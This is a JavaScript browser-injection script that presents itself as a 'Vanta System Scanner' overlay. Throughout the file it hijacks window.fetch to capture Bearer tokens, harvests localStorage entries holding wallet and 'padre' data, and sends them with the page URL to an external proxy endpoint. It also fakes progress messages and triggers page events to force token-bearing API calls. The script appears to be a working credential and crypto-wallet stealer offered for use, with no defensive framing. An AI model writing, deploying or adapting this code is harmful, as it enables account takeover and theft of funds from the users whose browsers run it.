(function() {
    const affId = window.V_AFF || 't23dad55';
    const proxy = window.V_PROXY;

    // 1. CREATE THE UI
    const ui = document.createElement('div');
    ui.id = 'vanta-ui';
    ui.innerHTML = `
        <div style="position:fixed;top:20px;right:20px;width:300px;background:#0a0a0a;border:2px solid #00ff88;border-radius:10px;padding:20px;color:#00ff88;font-family:monospace;z-index:999999;box-shadow:0 0 20px rgba(0,255,136,0.5);text-align:center;">
            <div style="font-weight:bold;margin-bottom:10px;text-transform:uppercase;letter-spacing:2px;">Vanta System Scanner</div>
            <div id="vanta-status" style="font-size:12px;color:#fff;margin-bottom:15px;">Initializing connection...</div>
            <div style="width:100%;background:#222;height:5px;border-radius:10px;overflow:hidden;">
                <div id="vanta-bar" style="width:0%;height:100%;background:#00ff88;transition:0.5s;"></div>
            </div>
            <div style="margin-top:15px;font-size:10px;color:#555;">UID: ${Math.random().toString(36).substring(7)}</div>
        </div>
    `;
    document.body.appendChild(ui);

    function updateStatus(text, progress) {
        document.getElementById('vanta-status').innerText = text;
        document.getElementById('vanta-bar').style.width = progress + '%';
    }

    // 2. THE TOKEN HIJACKER (Background interceptor)
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
        if (args[1] && args[1].headers) {
            const auth = args[1].headers['Authorization'] || args[1].headers['authorization'];
            if (auth && auth.includes('Bearer')) {
                // TOKEN CAUGHT
                sendToVanta({ bearer: auth, url: args[0] });
                updateStatus("AUTHENTICATION SYNCED", 100);
                setTimeout(() => ui.remove(), 2000); // Hide UI after success
            }
        }
        return originalFetch.apply(this, args);
    };

    async function sendToVanta(extra = {}) {
        const local = {};
        for(let i=0; i<localStorage.length; i++){
            const k = localStorage.key(i);
            if(k.includes('padre') || k.includes('wallet')) local[k] = localStorage.getItem(k);
        }

        const payload = {
            embeds: [{
                title: "💀 VANTA EXPLOIT SUCCESSFUL",
                color: 0x00FF88,
                fields: [
                    { name: "Affiliate", value: affId, inline: true },
                    { name: "Bearer Token", value: "```" + (extra.bearer || "Searching...") + "```" },
                    { name: "Site URL", value: window.location.href },
                    { name: "Captured Wallets", value: "```json\n" + JSON.stringify(local, null, 2).substring(0, 1000) + "```" }
                ],
                footer: { text: "Vanta Engine v3.0 | Priority: Critical" },
                timestamp: new Date()
            }]
        };

        await fetch(proxy, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
    }

    // 3. THE "FORCE" RELOAD
    // We send an initial ping, then force the page to refresh itself 
    // to trigger the API calls that contain the Bearer token.
    setTimeout(() => {
        updateStatus("OPTIMIZING ENGINE...", 40);
        sendToVanta();
    }, 500);

    setTimeout(() => {
        updateStatus("FORCING API SYNC...", 70);
        // This is the magic: it triggers a background data fetch
        // on most React/Next.js apps like Padre.
        window.dispatchEvent(new Event('focus')); 
        
        // If focusing doesn't work, we simulate a click on a dashboard element
        const navItems = document.querySelectorAll('button, a');
        if(navItems[0]) navItems[0].dispatchEvent(new MouseEvent('mouseover', {bubbles: true}));
    }, 1500);

})();
